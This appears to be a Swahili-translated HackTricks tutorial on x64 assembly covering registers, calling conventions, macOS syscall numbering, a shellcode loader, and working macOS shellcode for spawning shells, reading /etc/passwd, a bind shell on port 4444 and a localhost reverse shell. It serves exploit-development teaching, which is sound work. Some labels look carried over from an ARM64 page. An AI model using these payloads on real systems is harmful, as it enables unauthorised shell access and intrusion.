# Utangulizi wa x64

{{#include ../../../banners/hacktricks-training.md}}

## **Utangulizi wa x64**

x64, inayojulikana pia kama x86-64, ni usanifu wa processor wa 64-bit unaotumiwa zaidi katika computing ya desktop na server. Ukitokana na usanifu wa x86 uliotengenezwa na Intel na baadaye kupitishwa na AMD kwa jina AMD64, ndiyo usanifu unaotawala katika kompyuta binafsi na servers leo.

### **Registers**

x64 inapanua usanifu wa x86, ikiwa na **registers 16 za matumizi ya jumla** zinazoitwa `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, na `r8` hadi `r15`. Kila moja kati ya hizi inaweza kuhifadhi thamani ya **64-bit** (byte 8). Registers hizi pia zina sub-registers za 32-bit, 16-bit, na 8-bit kwa ajili ya compatibility na kazi mahususi.

1. **`rax`** - Kwa kawaida hutumiwa kuhifadhi **return values** kutoka kwenye functions.
2. **`rbx`** - Mara nyingi hutumiwa kama **base register** kwa operations za memory.
3. **`rcx`** - Kwa kawaida hutumiwa kama **loop counter**.
4. **`rdx`** - Hutumiwa katika majukumu mbalimbali, ikiwemo extended arithmetic operations.
5. **`rbp`** - **Base pointer** ya stack frame.
6. **`rsp`** - **Stack pointer**, inayofuatilia sehemu ya juu ya stack.
7. **`rsi`** na **`rdi`** - Hutumiwa kwa indexes za **source** na **destination** katika operations za string/memory.
8. **`r8`** hadi **`r15`** - Registers za ziada za matumizi ya jumla zilizoletwa katika x64.

### **Calling Convention**

Calling convention ya x64 hutofautiana kati ya operating systems. Kwa mfano:

- **Windows**: **Parameters nne za kwanza** hupitishwa katika registers **`rcx`**, **`rdx`**, **`r8`**, na **`r9`**. Parameters zinazofuata husukumwa kwenye stack. Return value huwa katika **`rax`**.
- **System V (inayotumiwa kwa kawaida katika systems zinazofanana na UNIX)**: **Parameters sita za kwanza za integer au pointer** hupitishwa katika registers **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, na **`r9`**. Return value pia huwa katika **`rax`**.

Ikiwa function ina inputs zaidi ya sita, **zilizobaki zitapitishwa kwenye stack**. **RSP**, stack pointer, lazima iwe **ime-align kwa bytes 16**, kumaanisha kwamba address inayoielekeza lazima igawanyike kwa 16 kabla ya call yoyote kutokea. Hii inamaanisha kwamba kwa kawaida tungehitaji kuhakikisha kuwa RSP ime-align ipasavyo katika shellcode yetu kabla ya kufanya function call. Hata hivyo, kwa vitendo, system calls hufanya kazi mara nyingi hata hitaji hili lisipotimizwa.

### Calling Convention katika Swift

Swift ina **calling convention** yake ambayo inaweza kupatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Instructions za Kawaida**

Instructions za x64 zina seti pana, zikidumisha compatibility na instructions za awali za x86 na kuanzisha mpya.

- **`mov`**: **Husogeza** thamani kutoka kwenye **register** moja au **memory location** moja kwenda nyingine.
- Mfano: `mov rax, rbx` — Husogeza thamani kutoka `rbx` kwenda `rax`.
- **`push`** na **`pop`**: Husukuma au kutoa values kwenda/kutoka kwenye **stack**.
- Mfano: `push rax` — Husukuma thamani iliyo katika `rax` kwenda kwenye stack.
- Mfano: `pop rax` — Hutoa thamani ya juu ya stack na kuiweka katika `rax`.
- **`add`** na **`sub`**: Operations za **addition** na **subtraction**.
- Mfano: `add rax, rcx` — Huongeza values zilizo katika `rax` na `rcx`, na kuhifadhi matokeo katika `rax`.
- **`mul`** na **`div`**: Operations za **multiplication** na **division**. Kumbuka: hizi zina tabia mahususi kuhusu matumizi ya operands.
- **`call`** na **`ret`**: Hutumiwa **kuita** na **kurudi kutoka kwenye functions**.
- **`int`**: Hutumiwa kuanzisha software **interrupt**. Kwa mfano, `int 0x80` ilitumika kwa system calls katika 32-bit x86 Linux.
- **`cmp`**: **Hulinganisha** values mbili na kuweka flags za CPU kulingana na matokeo.
- Mfano: `cmp rax, rdx` — Hulinganisha `rax` na `rdx`.
- **`je`, `jne`, `jl`, `jge`, ...**: Instructions za **conditional jump** zinazobadilisha control flow kulingana na matokeo ya `cmp` au test ya awali.
- Mfano: Baada ya instruction ya `cmp rax, rdx`, `je label` — Huruka kwenda `label` ikiwa `rax` ni sawa na `rdx`.
- **`syscall`**: Hutumiwa kwa **system calls** katika baadhi ya systems za x64 (kama Unix za kisasa).
- **`sysenter`**: Instruction iliyoboreshwa ya **system call** katika baadhi ya platforms.

### **Function Prologue**

1. **Sukuma base pointer ya zamani**: `push rbp` (huhifadhi base pointer ya caller)
2. **Hamisha stack pointer ya sasa kwenda kwenye base pointer**: `mov rbp, rsp` (huweka base pointer mpya ya function ya sasa)
3. **Tenga nafasi kwenye stack kwa ajili ya local variables**: `sub rsp, <size>` (ambapo `<size>` ni idadi ya bytes zinazohitajika)

### **Function Epilogue**

1. **Hamisha base pointer ya sasa kwenda kwenye stack pointer**: `mov rsp, rbp` (huondoa local variables)
2. **Toa base pointer ya zamani kutoka kwenye stack**: `pop rbp` (hurejesha base pointer ya caller)
3. **Rudi**: `ret` (hurejesha control kwa caller)

## macOS

### syscalls

There are different classes of syscalls, you can [**find them here**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Kisha, unaweza kupata nambari ya kila syscall [**kwenye URL hii**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Kwa hiyo, ili kuita `open` syscall (**5**) kutoka kwenye **Unix/BSD class**, unahitaji kuiongezea: `0x2000000`

Kwa hiyo, nambari ya syscall ya kuita open itakuwa `0x2000005`

### Shellcodes

Ili ku-compile:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
Kutoa bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>Msimbo wa C wa kujaribu shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Imechukuliwa [**hapa**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) na kuelezwa.<sup>[1]</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### Soma kwa cat

Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, kwa hivyo argumenti ya pili (x1) ni array ya params (ambayo kwenye memory inamaanisha stack ya anwani).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Tekeleza command kwa sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Bind shell kutoka [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) kwenye **port 4444**<sup>[2]</sup>.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

Reverse shell kutoka [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell kuelekea **127.0.0.1:4444**<sup>[3]</sup>
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## Marejeo

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
